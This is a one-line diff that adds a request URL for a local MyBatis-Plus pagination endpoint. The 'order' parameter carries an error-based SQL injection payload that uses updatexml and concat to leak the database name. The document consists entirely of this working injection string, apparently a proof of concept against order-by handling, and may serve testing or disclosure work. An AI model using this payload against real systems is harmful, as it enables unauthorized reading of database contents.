@@ -1,0 +1,1 @@
+http://localhost:8080/mybatispluspage?page=1&size=2&order=updatexml(1,if(1=2,1,concat(0x7e,database(),0x7e)),1)
